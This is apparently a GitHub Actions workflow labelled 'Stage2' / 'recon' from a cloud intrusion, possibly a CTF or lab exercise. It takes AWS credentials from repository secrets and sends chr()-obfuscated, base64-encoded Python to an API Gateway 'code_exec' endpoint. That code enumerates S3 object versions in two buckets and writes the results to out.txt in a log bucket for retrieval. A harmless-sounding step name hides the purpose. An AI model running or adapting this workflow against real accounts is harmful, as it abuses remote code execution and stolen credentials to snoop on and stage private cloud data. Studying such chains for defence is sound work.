name: Stage2
on:
  push:
    branches: [corgi]

permissions:
  contents: read

jobs:
  recon:
    runs-on: ubuntu-latest
    env:
      AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
      AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
      AWS_SESSION_TOKEN: ${{ secrets.AWS_SESSION_TOKEN }}
      AWS_DEFAULT_REGION: us-east-1
    steps:
      - name: Who am I
        run: aws sts get-caller-identity
        
      - name: Check S3 versioning via Lambda
        run: |
          pip install requests requests-aws4auth --quiet
          python3 -c "
            import boto3, base64, requests
            from requests_aws4auth import AWS4Auth
            
            API = 'https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec'
            creds = boto3.Session().get_credentials().get_frozen_credentials()
            from requests_aws4auth import AWS4Auth
            auth = AWS4Auth(creds.access_key, creds.secret_key, 'us-east-1', 'execute-api', session_token=creds.token)
            
            code = 'import boto3; s=boto3.client(chr(115)+chr(51),region_name=chr(117)+chr(115)+chr(45)+chr(101)+chr(97)+chr(115)+chr(116)+chr(45)+chr(49)); r1=s.list_object_versions(Bucket=chr(117)+chr(115)+chr(101)+chr(114)+chr(97)+chr(100)+chr(56)+chr(56)+chr(101)+chr(50)+chr(98)+chr(49)+chr(54)+chr(56)+chr(97)+chr(97)+chr(51)+chr(56)+chr(55)+chr(101)); r2=s.list_object_versions(Bucket=chr(108)+chr(111)+chr(103)+chr(97)+chr(100)+chr(56)+chr(56)+chr(101)+chr(50)+chr(98)+chr(49)+chr(54)+chr(56)+chr(97)+chr(97)+chr(51)+chr(56)+chr(55)+chr(101)); s.put_object(Bucket=chr(108)+chr(111)+chr(103)+chr(97)+chr(100)+chr(56)+chr(56)+chr(101)+chr(50)+chr(98)+chr(49)+chr(54)+chr(56)+chr(97)+chr(97)+chr(51)+chr(56)+chr(55)+chr(101),Key=chr(111)+chr(117)+chr(116)+chr(46)+chr(116)+chr(120)+chr(116),Body=str({chr(117):str(r1),chr(108):str(r2)}).encode())'
            
            r = requests.post(API, json={'code': base64.b64encode(code.encode()).decode()}, auth=auth)
            print(r.status_code, r.text)
            "
